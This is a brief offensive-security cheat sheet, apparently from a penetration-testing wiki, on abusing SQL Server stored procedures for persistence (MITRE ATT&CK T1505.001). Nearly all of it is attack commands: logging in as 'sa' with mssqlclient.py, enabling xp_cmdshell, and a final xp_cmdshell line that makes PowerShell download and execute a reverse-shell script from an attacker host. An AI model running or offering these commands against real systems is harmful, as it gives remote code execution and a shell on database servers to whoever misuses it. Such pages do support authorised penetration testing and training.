---
description: MITRE ATT&CK, Persistence, Sub-technique T1505.001
---

# SQL Stored Procedures

### Example Usage

#### Basic usage:

```bash
python3 mssqlclient.py sa@$ip
```

#### Configure xp\_cmdshell:

```bash
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

#### Enable Code Execution:

```bash
enable_xp_cmdshell
```

#### Obtaining a reverse shell from mssqlclient.py:&#x20;

```bash
xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://$ip:8080/revshell.ps1\")
```
